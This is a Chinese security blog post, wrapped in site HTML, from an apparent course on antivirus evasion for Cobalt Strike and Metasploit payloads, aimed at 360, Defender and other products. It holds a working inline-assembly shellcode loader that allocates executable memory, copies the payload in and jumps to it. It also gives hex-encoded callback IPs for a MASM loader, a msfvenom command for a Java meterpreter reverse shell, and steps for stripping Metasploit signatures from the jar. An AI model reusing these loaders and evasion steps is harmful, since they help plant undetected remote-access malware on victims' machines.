@@ -1,0 +1,267 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包 | ai潼</title><meta name="author" content="pwy"><meta name="copyright" content="pwy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="#知识点：1、ASM-CS-单汇编&amp;内联C 2、JAVA-MSF-源码修改&amp;打包 #章节点：编译代码面-ShellCode-混淆 编译代码面-编辑执行器-编写 编译代码面-分离加载器-编写 程序文件面-特征码定位-修改 程序文件面-加壳花指令-资源 代码加载面-Dll反射劫持-加载 权限逻辑面-杀毒进程干扰-结束 工具数据面-通讯内存流量-动态 对抗目标：X60 Defender">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包">
+<meta property="og:url" content="http://example.com/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/index.html">
+<meta property="og:site_name" content="ai潼">
+<meta property="og:description" content="#知识点：1、ASM-CS-单汇编&amp;内联C 2、JAVA-MSF-源码修改&amp;打包 #章节点：编译代码面-ShellCode-混淆 编译代码面-编辑执行器-编写 编译代码面-分离加载器-编写 程序文件面-特征码定位-修改 程序文件面-加壳花指令-资源 代码加载面-Dll反射劫持-加载 权限逻辑面-杀毒进程干扰-结束 工具数据面-通讯内存流量-动态 对抗目标：X60 Defender">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/tt.jpg">
+<meta property="article:published_time" content="2023-04-27T00:34:28.000Z">
+<meta property="article:modified_time" content="2023-05-06T12:59:26.846Z">
+<meta property="article:author" content="pwy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/tt.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Day111 免杀对抗-Java&ASM&汇编CS调用&内联C&MSF源码特征修改&Jar打包',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-06 20:59:26'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ai潼" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tt.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="ai潼"><span class="site-name">ai潼</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-27T00:34:28.000Z" title="发表于 2023-04-27 08:34:28">2023-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-06T12:59:26.846Z" title="更新于 2023-05-06 20:59:26">2023-05-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/8i3IGPgDn9GeJQ6a1zq34Q.png" alt="img"></p>
+<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、ASM-CS-单汇编&amp;内联C</p>
+<p>2、JAVA-MSF-源码修改&amp;打包</p>
+<h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p>
+<p>编译代码面-编辑执行器-编写</p>
+<p>编译代码面-分离加载器-编写</p>
+<p>程序文件面-特征码定位-修改</p>
+<p>程序文件面-加壳花指令-资源</p>
+<p>代码加载面-Dll反射劫持-加载</p>
+<p>权限逻辑面-杀毒进程干扰-结束</p>
+<p>工具数据面-通讯内存流量-动态</p>
+<h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p>
+<h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p>
+<h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p>
+<p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p>
+<blockquote>
+<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-ASM-ShellCode-纯汇编-amp-内联C混编-CS"><a href="#➢-ASM-ShellCode-纯汇编-amp-内联C混编-CS" class="headerlink" title="➢ ASM-ShellCode-纯汇编&amp;内联C混编-CS"></a>➢ ASM-ShellCode-纯汇编&amp;内联C混编-CS</h4><h4 id="➢-JAVA-ShellCode-源码修改-amp-打包EXE-MSF"><a href="#➢-JAVA-ShellCode-源码修改-amp-打包EXE-MSF" class="headerlink" title="➢ JAVA-ShellCode-源码修改&amp;打包EXE-MSF"></a>➢ JAVA-ShellCode-源码修改&amp;打包EXE-MSF</h4></blockquote>
+<h3 id="ASM-ShellCode-纯汇编-amp-内联C混编-CS"><a href="#ASM-ShellCode-纯汇编-amp-内联C混编-CS" class="headerlink" title="#ASM-ShellCode-纯汇编&amp;内联C混编-CS"></a>#ASM-ShellCode-纯汇编&amp;内联C混编-CS</h3><h5 id="1、编译汇编代码实现CS免杀"><a href="#1、编译汇编代码实现CS免杀" class="headerlink" title="1、编译汇编代码实现CS免杀"></a>1、编译汇编代码实现CS免杀</h5><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504093005342.png" alt="image-20230504093005342"></p>
+<p>来源：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1536">奇安信攻防社区-编译汇编代码实现免杀 (butian.net)</a></p>
+<p>IP地址：</p>
+<p>30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2fh,33h,00h</p>
+<p>10.130.4.204</p>
+<p>30&#x3D;1，2f&#x3D;0，2d&#x3D;.，32&#x3D;3，33&#x3D;4，31&#x3D;2 依次内推</p>
+<p>47.94.236.117</p>
+<p>33h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,30h,30h,36h,00h</p>
+<p>端口：82&#x3D;52h 88&#x3D;28h</p>
+<p>编译器下载：<a target="_blank" rel="noopener" href="https://www.masm32.com/">https://www.masm32.com/</a></p>
+<p>编译为obj文件：ml &#x2F;c &#x2F;coff &#x2F;Cp test.asm</p>
+<p>生成exe文件：link &#x2F;subsystem:console &#x2F;libpath:c:\masm32\lib test.obj</p>
+<h5 id="2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）"><a href="#2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）" class="headerlink" title="2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）"></a>2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）</h5><ul>
+<li><h5 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h5></li>
+</ul>
+<h6 id="把软件拖进去查看入口点"><a href="#把软件拖进去查看入口点" class="headerlink" title="把软件拖进去查看入口点"></a>把软件拖进去查看入口点</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506204759807.png" alt="image-20230506204759807"></p>
+<h6 id="将上面的二进制入口点数据替换到此处"><a href="#将上面的二进制入口点数据替换到此处" class="headerlink" title="将上面的二进制入口点数据替换到此处"></a>将上面的二进制入口点数据替换到此处</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205016545.png" alt="image-20230506205016545"></p>
+<h6 id="替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处"><a href="#替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处" class="headerlink" title="替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处"></a>替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205150820.png" alt="image-20230506205150820"></p>
+<h6 id="修改后全选内容右键"><a href="#修改后全选内容右键" class="headerlink" title="修改后全选内容右键"></a>修改后全选内容右键</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205527149.png" alt="image-20230506205527149"></p>
+<h6 id="选择全部复制"><a href="#选择全部复制" class="headerlink" title="选择全部复制"></a>选择全部复制</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205545080.png" alt="image-20230506205545080"></p>
+<h6 id="保存为新文件"><a href="#保存为新文件" class="headerlink" title="保存为新文件"></a>保存为新文件</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205637669.png" alt="image-20230506205637669"></p>
+<ul>
+<li><h5 id="内联C混编"><a href="#内联C混编" class="headerlink" title="内联C混编"></a>内联C混编</h5></li>
+</ul>
+<p>int main() {</p>
+<p>​    LPVOID lp &#x3D; GetProcAddress(LoadLibraryA(“kernel32.dll”), “VirtualAlloc”);</p>
+<p>​    size_t dw_size &#x3D; sizeof(buf);</p>
+<p>​    void* exec &#x3D; NULL;</p>
+<p>​    __asm</p>
+<p>​    {</p>
+<p>​        push 0x40; &#x2F;&#x2F;可读可写可执行页参数入栈</p>
+<p>​        push 0x1000; &#x2F;&#x2F;MEM_COMMIT参数值入栈</p>
+<p>​        mov eax, dw_size; &#x2F;&#x2F;定义空间大小</p>
+<p>​        push eax; &#x2F;&#x2F;将空间大小入栈</p>
+<p>​        push 0; &#x2F;&#x2F;由系统自行决定内存空间起始地址入栈</p>
+<p>​        mov eax, lp; &#x2F;&#x2F;移动到virtualAlloc函数地址</p>
+<p>​        call eax; &#x2F;&#x2F;运行该函数</p>
+<p>​        mov exec, eax;&#x2F;&#x2F;调用地址</p>
+<p>​    }</p>
+<p>​    LPVOID op &#x3D; GetProcAddress(LoadLibraryA(“kernel32.dll”), “RtlMoveMemory”);</p>
+<p>​    __asm</p>
+<p>​    {</p>
+<p>​        mov eax, dw_size;</p>
+<p>​        push eax;</p>
+<p>​        lea eax, buf;</p>
+<p>​        push eax;</p>
+<p>​        mov ecx, exec;</p>
+<p>​        push ecx;</p>
+<p>​        mov eax, op;</p>
+<p>​        call eax;</p>
+<p>​    }</p>
+<p>​    __asm</p>
+<p>​    {</p>
+<p>​        jmp exec;</p>
+<p>​    }</p>
+<p>​    return 0;</p>
+<p>}</p>
+<h3 id="JAVA-ShellCode-源码修改-amp-打包EXE-MSF（不是很实用）"><a href="#JAVA-ShellCode-源码修改-amp-打包EXE-MSF（不是很实用）" class="headerlink" title="#JAVA-ShellCode-源码修改&amp;打包EXE-MSF（不是很实用）"></a>#JAVA-ShellCode-源码修改&amp;打包EXE-MSF（不是很实用）</h3><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504093126658.png" alt="image-20230504093126658"></p>
+<h5 id="1、JAR包源码特征修改免杀（对方有java环境）"><a href="#1、JAR包源码特征修改免杀（对方有java环境）" class="headerlink" title="1、JAR包源码特征修改免杀（对方有java环境）"></a>1、JAR包源码特征修改免杀（对方有java环境）</h5><ul>
+<li><p>msf生成jar包：</p>
+<p> msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x.x LPORT&#x3D;xxxx -f jar -o msf.jar </p>
+</li>
+<li><p>-Jar反编译导出-jdgui</p>
+</li>
+<li><p>-修改上线配置-config</p>
+</li>
+<li><p>-修改启动主类-MANIFEST.MF</p>
+</li>
+<li><p>-修改执行代码-Main.java</p>
+</li>
+<li><p>-打包class-javac Main.java</p>
+</li>
+<li><p>-编译jar-jar cvfm xiaodi.jar META-INF&#x2F;MANIFEST.MF .</p>
+</li>
+</ul>
+<h6 id="反编译后导出"><a href="#反编译后导出" class="headerlink" title="反编译后导出"></a>反编译后导出</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504102810833.png" alt="image-20230504102810833"></p>
+<h6 id="把这些敏感文件名修改，将metasploit-dat改为config，将metasploit里面的payload-java剪切到根目录，改名为Main-java，并删除metasploit目录"><a href="#把这些敏感文件名修改，将metasploit-dat改为config，将metasploit里面的payload-java剪切到根目录，改名为Main-java，并删除metasploit目录" class="headerlink" title="把这些敏感文件名修改，将metasploit.dat改为config，将metasploit里面的payload.java剪切到根目录，改名为Main.java，并删除metasploit目录"></a>把这些敏感文件名修改，将metasploit.dat改为config，将metasploit里面的payload.java剪切到根目录，改名为Main.java，并删除metasploit目录</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103042498.png" alt="image-20230504103042498"></p>
+<h6 id="将原来的MANTFEST-MF的内容文件名对应也要修改"><a href="#将原来的MANTFEST-MF的内容文件名对应也要修改" class="headerlink" title="将原来的MANTFEST.MF的内容文件名对应也要修改"></a>将原来的MANTFEST.MF的内容文件名对应也要修改</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103322448.png" alt="image-20230504103322448"></p>
+<h6 id="修改成"><a href="#修改成" class="headerlink" title="修改成"></a>修改成</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103517868.png" alt="image-20230504103517868"></p>
+<h6 id="也可以修改成"><a href="#也可以修改成" class="headerlink" title="也可以修改成"></a>也可以修改成</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103613464.png" alt="image-20230504103613464"></p>
+<h6 id="原来代码里面，str4是从metasploit-dat里面获取的ip地址，j是从metasploit-dat获取端口，由于将从metasploit-dat删了，所以在代码里面定义"><a href="#原来代码里面，str4是从metasploit-dat里面获取的ip地址，j是从metasploit-dat获取端口，由于将从metasploit-dat删了，所以在代码里面定义" class="headerlink" title="原来代码里面，str4是从metasploit.dat里面获取的ip地址，j是从metasploit.dat获取端口，由于将从metasploit.dat删了，所以在代码里面定义"></a>原来代码里面，str4是从metasploit.dat里面获取的ip地址，j是从metasploit.dat获取端口，由于将从metasploit.dat删了，所以在代码里面定义</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103717412.png" alt="image-20230504103717412"></p>
+<h6 id="进行修改后"><a href="#进行修改后" class="headerlink" title="进行修改后"></a>进行修改后</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103907864.png" alt="image-20230504103907864"></p>
+<h6 id="最后一共有如下文件"><a href="#最后一共有如下文件" class="headerlink" title="最后一共有如下文件"></a>最后一共有如下文件</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104123446.png" alt="image-20230504104123446"></p>
+<h6 id="打包成class"><a href="#打包成class" class="headerlink" title="打包成class"></a>打包成class</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104112070.png" alt="image-20230504104112070"></p>
